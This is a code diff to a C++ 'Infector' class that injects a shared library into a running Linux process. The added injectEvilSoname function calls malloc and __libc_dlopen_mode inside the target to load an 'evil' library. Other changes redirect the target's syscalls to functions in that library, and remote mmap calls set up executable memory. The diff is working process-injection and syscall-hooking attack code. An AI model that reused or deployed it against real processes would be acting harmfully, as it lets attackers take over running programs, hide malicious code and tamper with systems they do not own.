@@ -14,11 +14,13 @@ extern "C"
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <sys/mman.h>
+#include <dlfcn.h>
 
 #define MAX_OPCODE_SIZE 30
 #define JMP_SIZE 5
 #define CALL_RAX_CMD "\xff\xd0\xcc\x90\x90\x90\x90\x90"
 #define JMP_CMD 0xe9
+#define MEM_SIZE 1000
 
 Infector::Infector(int pid_, const std::string &libcSoname) :
     mPid(pid_),
@@ -204,6 +206,54 @@ bool Infector::detachTarget()
     return pTargetOpt->detechTarget();
 }
 
+bool Infector::injectEvilSoname(const std::string &evilsoname)
+{
+    mEvilSoname = evilsoname;
+    if (!loadSoFile(mLicSoname))
+    {
+        LOGGER_ERROR << mLicSoname;
+        return false;
+    }
+
+    Elf64_Addr mallocAddr = getSym(mLicSoname, "malloc");
+    Elf64_Addr dlopenAddr = getSym(mLicSoname, "__libc_dlopen_mode");
+    if (!mallocAddr || !dlopenAddr)
+    {
+        LOGGER_ERROR << "parse sym error:";
+        LOGGER_ERROR << "malloc = " << mallocAddr;
+        LOGGER_ERROR << "dlopen = " << dlopenAddr;
+        return false;
+    }
+  
+    Elf64_Addr retAddr = callRemoteFunc(mallocAddr, MEM_SIZE);
+    if (!retAddr)
+    {
+        LOGGER_ERROR << "target process malloc failed";
+        return false;
+    }
+ 
+    if (!writeStrToTarget(retAddr, mEvilSoname))
+    {
+        LOGGER_ERROR << "writeStrToTarget";
+        return 0;
+    }
+
+    retAddr = callRemoteFunc(dlopenAddr, retAddr, RTLD_NOW|RTLD_GLOBAL, 0);
+    if (!retAddr)
+    {
+        LOGGER_ERROR << "target process dlopen failed";
+        return false;
+    }
+
+    if (!loadSoFile(mEvilSoname))
+    {
+        LOGGER_ERROR << "loadSoFile";
+        return false;
+    }
+
+    return true;
+}
+
 bool Infector::writeStrToTarget(Elf64_Addr &addr, const std::string &str)
 {
     return pTargetOpt->writeTarget(addr, (void *)str.c_str(), str.size());
@@ -215,26 +265,27 @@ Elf64_Addr Infector::syscallJmp(const std::string &syscall,
                                 Elf64_Addr tmpAddr)
 {
     Elf64_Addr syscallAddr = getSym(mLicSoname, syscall);
-    Elf64_Addr injectCallAddr = getSym("libinject.so", injectCall);
-    Elf64_Addr setSyscallAddr = getSym("libinject.so", setSyscall);
+    Elf64_Addr injectCallAddr = getSym(mEvilSoname, injectCall);
+    Elf64_Addr setSyscallAddr = getSym(mEvilSoname, setSyscall);
+    if (!syscallAddr || !injectCallAddr || !setSyscallAddr)
+    {
+        LOGGER_ERROR << "parse sym error";
+        return false;
+    }
 
     int offset = remoteFuncJump(syscallAddr, injectCallAddr, 
                                 tmpAddr, setSyscallAddr);
-
-    if (offset < 0) return 0;
+    if (offset < 0) return tmpAddr;
 
     return tmpAddr + offset;
 }
 
 bool Infector::injectSysTableInit()
 {
-    Elf64_Addr mmapAddr = getSym("libc-2.31.so", "mmap");
-
-    if (!loadSoFile("libinject.so"))
-    {
-        printf("=== %s, %d\n", __func__, __LINE__);
+    if (mEvilSoname.empty())
         return false;
-    }
+
+    Elf64_Addr mmapAddr = getSym(mLicSoname, "mmap");
 
     Elf64_Addr mmapRetAddr = callRemoteFunc(mmapAddr, 0, 4096, 
                                 PROT_READ | PROT_WRITE | PROT_EXEC, 
